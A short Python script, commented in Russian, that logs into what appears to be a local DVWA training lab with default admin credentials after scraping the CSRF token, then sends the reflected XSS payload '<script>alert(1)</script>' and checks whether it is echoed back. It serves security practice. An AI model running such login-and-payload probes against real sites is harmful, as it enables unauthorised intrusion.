#!/usr/bin/env python3
import requests
import re

# Создаём сессию
session = requests.Session()

# Шаг 1: Получаем страницу логина с токеном
print("[*] Getting login page...")
login_page = session.get("http://localhost:8081/login.php")

# Ищем CSRF токен (разные варианты)
token_patterns = [
    r'name="user_token"\s+value="([^"]+)"',
    r'user_token=([a-f0-9]+)',
    r'value="([a-f0-9]{32})"'
]

csrf_token = None
for pattern in token_patterns:
    match = re.search(pattern, login_page.text)
    if match:
        csrf_token = match.group(1)
        print(f"[+] Found token: {csrf_token}")
        break

if not csrf_token:
    print("[-] No CSRF token found, trying without token...")
    csrf_token = ""

# Шаг 2: Отправляем логин
print("[*] Sending login...")
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": csrf_token
}

response = session.post("http://localhost:8081/login.php", data=login_data)

# Шаг 3: Проверяем успешность
print("[*] Checking login status...")
index = session.get("http://localhost:8081/index.php")

if "Login" not in index.text and "Security Level" in index.text:
    print("[✓] Login successful!")
    
    # Шаг 4: Тестируем XSS
    print("[*] Testing XSS...")
    payload = "<script>alert(1)</script>"
    xss_response = session.get(
        "http://localhost:8081/vulnerabilities/xss_r/",
        params={"name": payload}
    )
    
    if payload in xss_response.text:
        print(f"[✓] XSS works! Payload reflected: {payload}")
        print("\n[🎉] SUCCESS! Vulnerability found!")
    else:
        print("[-] XSS not found")
else:
    print("[-] Login failed")
    print("[!] Try logging in manually in browser first")
